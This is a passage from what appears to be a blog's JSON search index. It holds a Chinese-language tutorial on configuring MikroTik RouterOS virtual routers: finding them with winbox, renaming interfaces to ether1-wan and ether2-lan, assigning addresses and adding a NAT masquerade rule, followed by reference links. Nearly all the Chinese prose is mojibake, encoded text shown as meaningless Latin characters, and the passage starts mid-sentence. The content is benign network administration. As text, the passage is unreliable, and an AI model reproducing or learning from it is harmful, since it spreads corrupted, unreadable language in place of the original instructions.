DNS172.16.2.4\nè‡³æ­¤ï¼Œä¸¤ä¸ªç½‘ç»œçš„ä¸»æœºåº”è¯¥å¯ä»¥pingé€šåŒä¸€ä¸ªç½‘ç»œçš„ä¸»æœºã€‚æ¥ä¸‹æ¥è®¾ç½®ä¸¤ä¸ªROSçš„IPåœ°å€ã€‚\næ‰“å¼€winboxï¼Œç‚¹å‡»NeighborsæŒ‰é’®ï¼Œä¼šè‡ªåŠ¨å—…æ¢ç½‘ç»œå†…çš„å­˜æ´»çš„è·¯ç”±å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nä¸Šå›¾ä¸ºè¾¹ç•Œè·¯ç”±å™¨çš„IPåœ°å€ï¼Œå¦‚æœåˆ†é…äº†IPåœ°å€åˆ™å¯ä»¥åœ¨æµè§ˆå™¨é€šè¿‡IPåœ°å€æµè§ˆè·¯ç”±å™¨çš„webç•Œé¢ï¼Œåœ¨å¦‚æœæ²¡æœ‰åˆ†é…IPåœ°å€åˆ™é€šè¿‡wibboxä½¿ç”¨MACåœ°å€ç™»å½•\nè¿›å…¥ä¹‹åï¼Œåœ¨å·¦ä¾§é€‰é¡¹å¡ä¼šåˆ—å‡ºè·¯ç”±å™¨æ‹¥æœ‰çš„æ‰€æœ‰ç½‘å¡æ¥å£ï¼Œç‚¹å‡»ä¹‹åè¿›å…¥åˆ°æ¥å£è¯¦æƒ…ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¼šåˆ—å‡ºè¯¥æ¥å£çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ç½‘å¡çš„MACåˆ†è¾¨è¯¥ç½‘å¡å¯¹åº”åœ¨vmwareä¸­çš„ç½‘å¡ï¼Œå°†ä¸¤ä¸ªç½‘å¡åç§°åˆ†åˆ«è®¾ç½®ä¸ºether1-wanå’Œether2-lanï¼Œä¹‹ååœ¨ip-\u0026gt;addressesé€‰é¡¹å¡ä¸­å°†ether-lanè®¾ç½®ä¸ºä¸‹å›¾ã€‚ether1-wanä¸ç”¨è®¾ç½®ï¼Œå› ä¸ºè¯¥ç½‘å¡ç½‘ç»œç±»å‹ä¸ºnatä¼šè‡ªåŠ¨dhcpåˆ†é…\nä¹‹ååœ¨IP-\u0026gt;Firewall-\u0026gt;NATä¸­æ–°å»ºè§„åˆ™ï¼Œchainï¼šsrcnatï¼Œout.interface:ether2-lan,action:masquerade\nè¯¥è§„åˆ™å°†ä½¿å¾—è·¯ç”±å™¨ä¸¤è¾¹çš„ç½‘ç»œè”é€šã€‚\nå‚è€ƒ\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""}]